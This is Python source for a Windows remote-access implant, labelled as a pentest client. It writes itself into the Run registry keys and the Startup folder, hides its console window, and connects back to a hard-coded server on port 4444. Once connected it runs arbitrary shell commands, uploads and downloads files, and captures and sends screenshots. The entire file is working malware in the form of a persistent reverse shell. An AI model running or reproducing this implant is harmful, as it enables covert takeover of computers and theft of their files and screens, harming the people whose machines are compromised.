import socket
import struct
import json
import os
import subprocess
import sys
import time
import logging
import ctypes
import winreg

# Configuration (insert your server IP/port)
SERVER_IP = "192.168.94.136"
SERVER_PORT = 4444
RUN_KEY_NAME = "PenTestClient"

# Logging setup
logging.basicConfig(
    filename="client.log",
    level=logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s",
)


def register_persistence():
    """
    Registers this script to run on startup via HKLM Run key.
    """
    # choose pythonw.exe if available to hide console window
    python_exe = sys.executable
    pythonw = os.path.join(os.path.dirname(python_exe), "pythonw.exe")
    if os.path.exists(pythonw):
        python_exe = pythonw

    try:
        script_path = os.path.abspath(__file__)
        exe_path = f'"{python_exe}" "{script_path}"'
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY,
        )
        winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        logging.info("Registered persistence in registry")
    except Exception as e:
        logging.error(f"Failed to register in HKLM: {e}")
        # Fallback to HKCU if HKLM write fails
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            logging.info("Registered persistence in HKCU registry")
        except Exception as e2:
            logging.error(f"Failed to register persistence in HKCU: {e2}")

    # Fallback: ensure launch at login via Startup folder
    try:
        startup_dir = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup",
        )
        bat_path = os.path.join(startup_dir, f"{RUN_KEY_NAME}.bat")
        script_path = os.path.abspath(__file__)
        with open(bat_path, "w") as bat:
            bat.write("@echo off\r\n")
            bat.write(f'start "" /MIN "{python_exe}" "{script_path}"\r\n')
        logging.info(f"Created Startup folder launch: {bat_path}")
    except Exception as e3:
        logging.error(f"Failed to create Startup folder .bat: {e3}")


def send_json(sock, obj):
    data = json.dumps(obj).encode("utf-8")
    header = struct.pack(">Q", len(data))
    sock.sendall(header + data)


def recv_json(sock):
    header = recvall(sock, 8)
    if not header:
        return None
    length = struct.unpack(">Q", header)[0]
    data = recvall(sock, length)
    return json.loads(data.decode("utf-8"))


def recvall(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def handle_command(sock, cmd_obj):
    cmd = cmd_obj.get("command")
    try:
        if cmd == "exec":
            proc = subprocess.Popen(
                cmd_obj["cmd"],
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            out, err = proc.communicate()
            result = (out + err).decode(errors="ignore")
            send_json(sock, {"status": "OK", "output": result})

        elif cmd == "getcwd":
            cwd = os.getcwd()
            send_json(sock, {"cwd": cwd})

        elif cmd == "cd":
            path = cmd_obj.get("path")
            os.chdir(path)
            send_json(sock, {"status": "OK", "cwd": os.getcwd()})

        elif cmd == "ls":
            entries = os.listdir()
            send_json(sock, {"entries": entries})

        elif cmd == "priv":
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            send_json(
                sock, {"privilege": "Administrator" if is_admin else "Standard User"}
            )

        elif cmd == "upload":
            dest = cmd_obj["path"]
            size = cmd_obj["size"]
            with open(dest, "wb") as f:
                remaining = size
                while remaining:
                    chunk = sock.recv(min(4096, remaining))
                    if not chunk:
                        break
                    f.write(chunk)
                    remaining -= len(chunk)
            send_json(sock, {"status": "OK"})

        elif cmd == "download":
            path = cmd_obj["path"]
            if not os.path.exists(path):
                send_json(sock, {"status": "ERROR", "message": "File not found"})
                return
            size = os.path.getsize(path)
            send_json(sock, {"size": size})
            with open(path, "rb") as f:
                while True:
                    buf = f.read(4096)
                    if not buf:
                        break
                    sock.sendall(buf)

        elif cmd == "screenshot":
            ps_cmd = (
                'powershell -command "'
                "Add-Type -AssemblyName System.Windows.Forms;"
                "Add-Type -AssemblyName System.Drawing;"
                "$bounds = [Windows.Forms.SystemInformation]::VirtualScreen;"
                "$b = New-Object Drawing.Bitmap($bounds.Width, $bounds.Height);"
                "$g = [Drawing.Graphics]::FromImage($b);"
                "$g.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size);"
                "$file = [IO.Path]::Combine($env:TEMP, 'screencap.png');"
                "$b.Save($file, 'png');"
                'Write-Output $file"'
            )
            result = subprocess.check_output(ps_cmd, shell=True).decode().strip()
            if os.path.exists(result):
                size = os.path.getsize(result)
                send_json(sock, {"size": size})
                with open(result, "rb") as f:
                    sock.sendall(f.read())
                os.remove(result)
            else:
                send_json(sock, {"size": 0})

        elif cmd == "exit":
            sock.close()
            sys.exit(0)

        else:
            send_json(sock, {"status": "ERROR", "message": "Unknown command"})
    except Exception as e:
        send_json(sock, {"status": "ERROR", "message": str(e)})
        logging.error(f"Error handling {cmd}: {e}")


if __name__ == "__main__":
    register_persistence()
    while True:
        try:
            with socket.create_connection((SERVER_IP, SERVER_PORT)) as s:
                logging.info(f"Connected to {SERVER_IP}:{SERVER_PORT}")
                while True:
                    cmd_obj = recv_json(s)
                    if not cmd_obj:
                        break
                    handle_command(s, cmd_obj)
        except Exception as e:
            logging.error(f"Connection error: {e}")
            time.sleep(5)
